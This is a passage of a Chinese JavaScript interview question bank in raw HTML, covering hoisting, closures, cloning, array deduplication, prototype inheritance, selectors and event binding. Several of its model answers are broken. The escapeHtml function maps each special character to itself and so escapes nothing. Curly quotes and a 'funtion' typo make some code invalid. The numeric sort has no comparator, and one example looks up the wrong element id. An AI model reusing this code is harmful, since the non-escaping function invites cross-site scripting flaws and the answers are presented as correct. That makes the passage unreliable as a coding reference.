class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function escapeHtml(str) {</span><br><span class="line">return str.replace(/[<>”&]/g, function(match) {</span><br><span class="line">    switch (match) {</span><br><span class="line">        case “<”:</span><br><span class="line">            return “<”;</span><br><span class="line">        case “>”:</span><br><span class="line">            return “>”;</span><br><span class="line">        case “&”:</span><br><span class="line">            return “&”;</span><br><span class="line">        case “\””:</span><br><span class="line">            return “"”;</span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="17-foo-foo-bar-，这行代码是什么意思？为什么要这样写？"><a href="#17-foo-foo-bar-，这行代码是什么意思？为什么要这样写？" class="headerlink" title="==17. foo = foo||bar ，这行代码是什么意思？为什么要这样写？=="></a>==17. foo = foo||bar ，这行代码是什么意思？为什么要这样写？==</h3><p>答案：if(!foo) foo = bar; //如果foo存在，值不变，否则把bar的值赋给foo。</p><p>短路表达式：作为”&&”和”||”操作符的操作数表达式，这些表达式在进行求值时，只要最终的结果已经可以确定是真或假，求值过程便告终止，这称之为短路求值。</p><h3 id="18-看下列代码，将会输出什么"><a href="#18-看下列代码，将会输出什么" class="headerlink" title="==18. 看下列代码，将会输出什么?="></a>==18. 看下列代码，将会输出什么?=</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var foo = 1;</span><br><span class="line">function(){</span><br><span class="line">    console.log(foo);</span><br><span class="line">    var foo = 2;</span><br><span class="line">    console.log(foo);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>答案：输出undefined 和 2。上面代码相当于：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var foo = 1;</span><br><span class="line">function(){</span><br><span class="line">    var foo;</span><br><span class="line">    console.log(foo); //undefined</span><br><span class="line">    foo = 2;</span><br><span class="line">    console.log(foo); // 2;  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>函数声明与变量声明会被JavaScript引擎隐式地提升到当前作用域的顶部，但是只提升名称不会提升赋值部分。</p><h3 id="19-用js实现随机选取10–100之间的10个数字，存入一个数组，并排序。"><a href="#19-用js实现随机选取10–100之间的10个数字，存入一个数组，并排序。" class="headerlink" title="==19. 用js实现随机选取10–100之间的10个数字，存入一个数组，并排序。=="></a>==19. 用js实现随机选取10–100之间的10个数字，存入一个数组，并排序。==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var iArray = [];</span><br><span class="line">funtion getRandom(istart, iend){</span><br><span class="line">        var iChoice = iend - istart +1;</span><br><span class="line">        return Math.floor(Math.random() * iChoice + istart);</span><br><span class="line">}</span><br><span class="line">for(var i=0; i<10; i++){</span><br><span class="line">        iArray.push(getRandom(10,100));</span><br><span class="line">}</span><br><span class="line">iArray.sort();</span><br></pre></td></tr></tbody></table></figure><h3 id="20-把两个数组合并，并删除第二个元素。"><a href="#20-把两个数组合并，并删除第二个元素。" class="headerlink" title="==20. 把两个数组合并，并删除第二个元素。=="></a>==20. 把两个数组合并，并删除第二个元素。==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array1 = ['a','b','c'];</span><br><span class="line">var bArray = ['d','e','f'];</span><br><span class="line">var cArray = array1.concat(bArray);</span><br><span class="line">cArray.splice(1,1);</span><br></pre></td></tr></tbody></table></figure><h3 id="21-怎样添加、移除、移动、复制、创建和查找节点（原生JS，实在基础，没细写每一步）"><a href="#21-怎样添加、移除、移动、复制、创建和查找节点（原生JS，实在基础，没细写每一步）" class="headerlink" title="==21. 怎样添加、移除、移动、复制、创建和查找节点（原生JS，实在基础，没细写每一步）=="></a>==21. 怎样添加、移除、移动、复制、创建和查找节点（原生JS，实在基础，没细写每一步）==</h3><ol><li><p>创建新节点</p><ul><li>createDocumentFragment() //创建一个DOM片段</li><li>createElement() //创建一个具体的元素</li><li>createTextNode() //创建一个文本节点</li></ul></li><li><p>添加、移除、替换、插入</p></li></ol><ul><li>appendChild() //添加</li><li>removeChild() //移除</li><li>replaceChild() //替换</li><li>insertBefore() //插入</li></ul><ol start="3"><li>查找</li></ol><ul><li>getElementsByTagName() //通过标签名称</li><li>getElementsByName() //通过元素的Name属性的值</li><li>getElementById() //通过元素Id，唯一性</li></ul><h3 id="22-有这样一个URL：http-item-taobao-com-item-htm-a-1-amp-b-2-amp-c-amp-d-xxx-amp-e，请写一段JS程序提取URL中的各个GET参数-参数名和参数个数不确定-，将其按key-value形式返回到一个json结构中，如-a-39-1-39-b-’2’-c-’’-d-’xxx’-e-undefined-。"><a href="#22-有这样一个URL：http-item-taobao-com-item-htm-a-1-amp-b-2-amp-c-amp-d-xxx-amp-e，请写一段JS程序提取URL中的各个GET参数-参数名和参数个数不确定-，将其按key-value形式返回到一个json结构中，如-a-39-1-39-b-’2’-c-’’-d-’xxx’-e-undefined-。" class="headerlink" title="==22. 有这样一个URL：http://item.taobao.com/item.htm?a=1&b=2&c=&d=xxx&e，请写一段JS程序提取URL中的各个GET参数(参数名和参数个数不确定)，将其按key-value形式返回到一个json结构中，如{a:'1', b:’2’, c:’’, d:’xxx’, e:undefined}。=="></a>==22. 有这样一个URL：<a href="http://item.taobao.com/item.htm?a=1&b=2&c=&d=xxx&e，请写一段JS程序提取URL中的各个GET参数(参数名和参数个数不确定)，将其按key-value形式返回到一个json结构中，如{a:'1'" target="_blank" rel="noopener">http://item.taobao.com/item.htm?a=1&b=2&c=&d=xxx&e，请写一段JS程序提取URL中的各个GET参数(参数名和参数个数不确定)，将其按key-value形式返回到一个json结构中，如{a:'1'</a>, b:’2’, c:’’, d:’xxx’, e:undefined}。==</h3><p>答案：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function serilizeUrl(url) {</span><br><span class="line">    var result = {};</span><br><span class="line">    url = url.split("?")[1];</span><br><span class="line">    var map = url.split("&");</span><br><span class="line">    for(var i = 0, len = map.length; i < len; i++) {</span><br><span class="line">        result[map[i].split("=")[0]] = map[i].split("=")[1];</span><br><span class="line">    }</span><br><span class="line">    return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="23-正则表达式构造函数var-reg-new-RegExp-“xxx”-与正则表达字面量var-reg-有什么不同？匹配邮箱的正则表达式？"><a href="#23-正则表达式构造函数var-reg-new-RegExp-“xxx”-与正则表达字面量var-reg-有什么不同？匹配邮箱的正则表达式？" class="headerlink" title="==23. 正则表达式构造函数var reg=new RegExp(“xxx”)与正则表达字面量var reg=//有什么不同？匹配邮箱的正则表达式？=="></a>==23. 正则表达式构造函数var reg=new RegExp(“xxx”)与正则表达字面量var reg=//有什么不同？匹配邮箱的正则表达式？==</h3><p>答案：当使用RegExp()构造函数的时候，不仅需要转义引号（即\”表示”），并且还需要双反斜杠（即\表示一个\）。使用正则表达字面量的效率更高。</p><p>邮箱的正则匹配：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var regMail = /^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+((.[a-zA-Z0-9_-]{2,3}){1,2})$/;</span><br></pre></td></tr></tbody></table></figure><h3 id="24-看下面代码，给出输出结果。"><a href="#24-看下面代码，给出输出结果。" class="headerlink" title="==24. 看下面代码，给出输出结果。=="></a>==24. 看下面代码，给出输出结果。==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(var i=1;i<=3;i++){</span><br><span class="line">  setTimeout(function(){</span><br><span class="line">      console.log(i);   </span><br><span class="line">  },0); </span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>答案：4 4 4。</p><p>原因：++Javascript事件处理器在线程空闲之前不会运行++。那么问题来了，如何让上述代码输出1 2 3？</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for(var i=1;i<=3;i++){</span><br><span class="line">   setTimeout((function(a){  //改成立即执行函数</span><br><span class="line">       console.log(a);   </span><br><span class="line">   })(i),0); </span><br><span class="line">};</span><br><span class="line"> </span><br><span class="line">1           //输出</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></tbody></table></figure><h3 id="25-写一个function，清除字符串前后的空格。（兼容所有浏览器）"><a href="#25-写一个function，清除字符串前后的空格。（兼容所有浏览器）" class="headerlink" title="==25. 写一个function，清除字符串前后的空格。（兼容所有浏览器）=="></a>==25. 写一个function，清除字符串前后的空格。（兼容所有浏览器）==</h3><p>使用自带接口trim()，考虑兼容性：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (!String.prototype.trim) {</span><br><span class="line"> String.prototype.trim = function() {</span><br><span class="line"> return this.replace(/^\s+/, "").replace(/\s+$/,"");</span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">// test the function</span><br><span class="line">var str = " \t\n test string ".trim();</span><br><span class="line">alert(str == "test string"); // alerts "true"</span><br></pre></td></tr></tbody></table></figure><h3 id="26-Javascript中callee和caller的作用？"><a href="#26-Javascript中callee和caller的作用？" class="headerlink" title="==26. Javascript中callee和caller的作用？=="></a>==26. Javascript中callee和caller的作用？==</h3><p>答案：</p><p>caller是返回一个对函数的引用，该函数调用了当前函数；</p><p>callee是返回正在被执行的function函数，也就是所指定的function对象的正文。</p><p>那么问题来了？如果一对兔子每月生一对兔子；一对新生兔，从第二个月起就开始生兔子；假定每对兔子都是一雌一雄，试问一对兔子，第n个月能繁殖成多少对兔子？（使用callee完成）</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var result=[];</span><br><span class="line">function fn(n){  //典型的斐波那契数列</span><br><span class="line">   if(n==1){</span><br><span class="line">        return 1;</span><br><span class="line">   }else if(n==2){</span><br><span class="line">           return 1;</span><br><span class="line">   }else{</span><br><span class="line">        if(result[n]){</span><br><span class="line">                return result[n];</span><br><span class="line">        }else{</span><br><span class="line">                //argument.callee()表示fn()</span><br><span class="line">                result[n]=arguments.callee(n-1)+arguments.callee(n-2);</span><br><span class="line">                return result[n];</span><br><span class="line">        }</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h2><h3 id="1-实现一个函数clone，可以对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制"><a href="#1-实现一个函数clone，可以对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制" class="headerlink" title="==1. 实现一个函数clone，可以对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制=="></a>==1. 实现一个函数clone，可以对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制==</h3><ul><li>考察点1：对于基本数据类型和引用数据类型在内存中存放的是值还是指针这一区别是否清楚</li><li>考察点2：是否知道如何判断一个变量是什么类型的</li><li>考察点3：递归算法的设计<br>// 方法一：</li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// 方法一：</span><br><span class="line">Object.prototype.clone = function() {</span><br><span class="line">    var o = this.constructor === Array ? [] : {};</span><br><span class="line">    for (var e in this) {</span><br><span class="line">        o[e] = typeof this[e] === "object" ? this[e].clone() : this[e];</span><br><span class="line">    }</span><br><span class="line">    return o;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">//方法二：</span><br><span class="line">/**</span><br><span class="line"> * 克隆一个对象</span><br><span class="line"> * @param Obj</span><br><span class="line"> * @returns</span><br><span class="line"> */</span><br><span class="line">function clone(Obj) {</span><br><span class="line">    var buf;</span><br><span class="line">    if (Obj instanceof Array) {</span><br><span class="line">        buf = []; //创建一个空的数组</span><br><span class="line">        var i = Obj.length;</span><br><span class="line">        while (i--) {</span><br><span class="line">            buf[i] = clone(Obj[i]);</span><br><span class="line">        }</span><br><span class="line">        return buf;</span><br><span class="line">    } else if (Obj instanceof Object) {</span><br><span class="line">        buf = {}; //创建一个空对象</span><br><span class="line">        for (var k in Obj) { //为这个对象添加新的属性</span><br><span class="line">            buf[k] = clone(Obj[k]);</span><br><span class="line">        }</span><br><span class="line">        return buf;</span><br><span class="line">    } else { //普通变量直接赋值</span><br><span class="line">        return Obj;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="2-如何消除一个数组里面重复的元素？"><a href="#2-如何消除一个数组里面重复的元素？" class="headerlink" title="==2. 如何消除一个数组里面重复的元素？=="></a>==2. 如何消除一个数组里面重复的元素？==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1, 2, 3, 3, 4, 4, 5, 5, 6, 1, 9, 3, 25, 4];</span><br><span class="line"> </span><br><span class="line">function deRepeat() {</span><br><span class="line">    var newArr = [];</span><br><span class="line">    var obj = {};</span><br><span class="line">    var index = 0;</span><br><span class="line">    var l = arr.length;</span><br><span class="line">    for (var i = 0; i < l; i++) {</span><br><span class="line">        if (obj[arr[i]] == undefined) {</span><br><span class="line">            obj[arr[i]] = 1;</span><br><span class="line">            newArr[index++] = arr[i];</span><br><span class="line">        } else if (obj[arr[i]] == 1)</span><br><span class="line">            continue;</span><br><span class="line">    }</span><br><span class="line">    return newArr;</span><br><span class="line"> </span><br><span class="line">}</span><br><span class="line">var newArr2 = deRepeat(arr);</span><br><span class="line">alert(newArr2); //输出1,2,3,4,5,6,9,25</span><br></pre></td></tr></tbody></table></figure><h3 id="3-小贤是一条可爱的小狗-Dog-，它的叫声很好听-wow-，每次看到主人的时候就会乖乖叫一声-yelp-。从这段描述可以得到以下对象："><a href="#3-小贤是一条可爱的小狗-Dog-，它的叫声很好听-wow-，每次看到主人的时候就会乖乖叫一声-yelp-。从这段描述可以得到以下对象：" class="headerlink" title="==3. 小贤是一条可爱的小狗(Dog)，它的叫声很好听(wow)，每次看到主人的时候就会乖乖叫一声(yelp)。从这段描述可以得到以下对象：=="></a>==3. 小贤是一条可爱的小狗(Dog)，它的叫声很好听(wow)，每次看到主人的时候就会乖乖叫一声(yelp)。从这段描述可以得到以下对象：==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Dog() {</span><br><span class="line">       this.wow = function() {</span><br><span class="line">               alert(’Wow’);</span><br><span class="line">      }</span><br><span class="line">       this.yelp = function() {</span><br><span class="line">              this.wow();</span><br><span class="line">      }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了-MadDog-，一看到人就会每隔半秒叫一声-wow-地不停叫唤-yelp-。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）"><a href="#小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了-MadDog-，一看到人就会每隔半秒叫一声-wow-地不停叫唤-yelp-。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）" class="headerlink" title="==小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了(MadDog)，一看到人就会每隔半秒叫一声(wow)地不停叫唤(yelp)。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）=="></a>==小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了(MadDog)，一看到人就会每隔半秒叫一声(wow)地不停叫唤(yelp)。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）==</h3><p>答案：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function MadDog() {</span><br><span class="line">    this.yelp = function() {</span><br><span class="line">          var self = this;         </span><br><span class="line">          setInterval(function() {</span><br><span class="line">                self.wow();     </span><br><span class="line">          }, 500);</span><br><span class="line">      }</span><br><span class="line">}</span><br><span class="line">MadDog.prototype = new Dog();        </span><br><span class="line"> </span><br><span class="line">//for test</span><br><span class="line">var dog = new Dog();</span><br><span class="line">dog.yelp();</span><br><span class="line">var madDog = new MadDog();</span><br><span class="line">madDog.yelp();</span><br></pre></td></tr></tbody></table></figure><h3 id="4-下面这个ul，如何点击每一列的时候alert其index-（闭包）"><a href="#4-下面这个ul，如何点击每一列的时候alert其index-（闭包）" class="headerlink" title="==4. 下面这个ul，如何点击每一列的时候alert其index?（闭包）=="></a>==4. 下面这个ul，如何点击每一列的时候alert其index?（闭包）==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><ul id=”test”></span><br><span class="line">    <li>这是第一条</li></span><br><span class="line">    <li>这是第二条</li></span><br><span class="line">    <li>这是第三条</li></span><br><span class="line"></ul></span><br></pre></td></tr></tbody></table></figure><p>答案：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 方法一：</span><br><span class="line">var lis=document.getElementById('2223').getElementsByTagName('li');</span><br><span class="line">for(var i=0;i<3;i++)</span><br><span class="line">{</span><br><span class="line">    lis[i].index=i;</span><br><span class="line">    lis[i].onclick=function(){</span><br><span class="line">        alert(this.index);</span><br><span class="line">    };</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">//方法二：</span><br><span class="line">var lis=document.getElementById('2223').getElementsByTagName('li');</span><br><span class="line">for(var i=0;i<3;i++)</span><br><span class="line">{</span><br><span class="line">    lis[i].index=i;</span><br><span class="line">    lis[i].onclick=(function(a){</span><br><span class="line">        return function() {</span><br><span class="line">            alert(a);</span><br><span class="line">        }</span><br><span class="line">    })(i);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="5-编写一个JavaScript函数，输入指定类型的选择器-仅需支持id，class，tagName三种简单CSS选择器，无需兼容组合选择器-可以返回匹配的DOM节点，需考虑浏览器兼容性和性能。"><a href="#5-编写一个JavaScript函数，输入指定类型的选择器-仅需支持id，class，tagName三种简单CSS选择器，无需兼容组合选择器-可以返回匹配的DOM节点，需考虑浏览器兼容性和性能。" class="headerlink" title="==5. 编写一个JavaScript函数，输入指定类型的选择器(仅需支持id，class，tagName三种简单CSS选择器，无需兼容组合选择器)可以返回匹配的DOM节点，需考虑浏览器兼容性和性能。=="></a>==5. 编写一个JavaScript函数，输入指定类型的选择器(仅需支持id，class，tagName三种简单CSS选择器，无需兼容组合选择器)可以返回匹配的DOM节点，需考虑浏览器兼容性和性能。==</h3><p>答案：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">var query = function(selector) {</span><br><span class="line">                var reg = /^(#)?(\.)?(\w+)$/img;</span><br><span class="line">                var regResult = reg.exec(selector);</span><br><span class="line">                var result = [];</span><br><span class="line">                //如果是id选择器</span><br><span class="line">                if(regResult[1]) {</span><br><span class="line">                    if(regResult[3]) {</span><br><span class="line">                        if(typeof document.querySelector === "function") {</span><br><span class="line">                            result.push(document.querySelector(regResult[3]));</span><br><span class="line">                        }</span><br><span class="line">                        else {</span><br><span class="line">                            result.push(document.getElementById(regResult[3]));</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                //如果是class选择器</span><br><span class="line">                else if(regResult[2]) {</span><br><span class="line">                    if(regResult[3]) {</span><br><span class="line">                        if(typeof document.getElementsByClassName === 'function') {</span><br><span class="line">                            var doms = document.getElementsByClassName(regResult[3]);</span><br><span class="line">                            if(doms) {</span><br><span class="line">                                result = converToArray(doms);</span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                        //如果不支持getElementsByClassName函数</span><br><span class="line">                        else {</span><br><span class="line">                            var allDoms = document.getElementsByTagName("*") ;</span><br><span class="line">                            for(var i = 0, len = allDoms.length; i < len; i++) {</span><br><span class="line">                                if(allDoms[i].className.search(new RegExp(regResult[2])) > -1) {</span><br><span class="line">                                    result.push(allDoms[i]);</span><br><span class="line">                                }</span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                //如果是标签选择器</span><br><span class="line">                else if(regResult[3]) {</span><br><span class="line">                    var doms = document.getElementsByTagName(regResult[3].toLowerCase());</span><br><span class="line">                    if(doms) {</span><br><span class="line">                        result = converToArray(doms);</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                return result;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            function converToArray(nodes){</span><br><span class="line">                  var array = null;         </span><br><span class="line">                  try{        </span><br><span class="line">                        array = Array.prototype.slice.call(nodes,0);//针对非IE浏览器         </span><br><span class="line">                  }catch(ex){</span><br><span class="line">                      array = new Array();         </span><br><span class="line">                      for( var i = 0 ,len = nodes.length; i < len ; i++ ) { </span><br><span class="line">                          array.push(nodes[i])         </span><br><span class="line">                      }         </span><br><span class="line">                  }      </span><br><span class="line">                  return array;</span><br><span class="line">          }</span><br></pre></td></tr></tbody></table></figure><h3 id="6-请评价以下代码并给出改进意见。"><a href="#6-请评价以下代码并给出改进意见。" class="headerlink" title="==6. 请评价以下代码并给出改进意见。=="></a>==6. 请评价以下代码并给出改进意见。==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(window.addEventListener){</span><br><span class="line">    var addListener = function(el,type,listener,useCapture){</span><br><span class="line">        el.addEventListener(type,listener,useCapture);</span><br><span class="line">  };</span><br><span class="line">}</span><br><span class="line">else if(document.all){</span><br><span class="line">    addListener = function(el,type,listener){</span><br><span class="line">        el.attachEvent("on"+type,function(){</span><br><span class="line">          listener.apply(el);</span><br><span class="line">      });</span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>评价：</p><ul><li>不应该在if和else语句中声明addListener函数，应该先声明；</li><li>不需要使用window.addEventListener或document.all来进行检测浏览器，应该使用能力检测；</li><li>由于attachEvent在IE中有this指向问题，所以调用它时需要处理一下</li></ul><p>改进如下： </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function addEvent(elem, type, handler) {　　</span><br><span class="line">    if (elem.addEventListener) {　　　　</span><br><span class="line">        elem.addEventListener(type, handler, false);　　</span><br><span class="line">    } else if (elem.attachEvent) {　　　　</span><br><span class="line">        elem['temp' + type + handler] = handler;　　　　</span><br><span class="line">        elem[type + handler] = function() {　　　　</span><br><span class="line">            elem['temp' + type + handler].apply(elem);　　</span><br><span class="line">        };　　</span><br><span class="line">        elem.attachEvent('on' + type, elem[type + handler]);　</span><br><span class="line">    } else {　　</span><br><span class="line">        elem['on' + type] = handler;　　</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="7-给String对象添加一个方法，传入一个string类型的参数，然后将string的每个字符间价格空格返回，例如："><a href="#7-给String对象添加一个方法，传入一个string类型的参数，然后将string的每个字符间价格空格返回，例如：" class="headerlink" title="==7. 给String对象添加一个方法，传入一个string类型的参数，然后将string的每个字符间价格空格返回，例如：=="></a>==7. 给String对象添加一个方法，传入一个string类型的参数，然后将string的每个字符间价格空格返回，例如：==</h3><h3 id="addSpace-“hello-world”-gt-‘h-e-l-l-o-w-o-r-l-d’"><a href="#addSpace-“hello-world”-gt-‘h-e-l-l-o-w-o-r-l-d’" class="headerlink" title="==addSpace(“hello world”) // -> ‘h e l l o  w o r l d’=="></a>==addSpace(“hello world”) // -> ‘h e l l o  w o r l d’==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.spacify = function() {</span><br><span class="line">    return this.split('').join(' ');</span><br><span 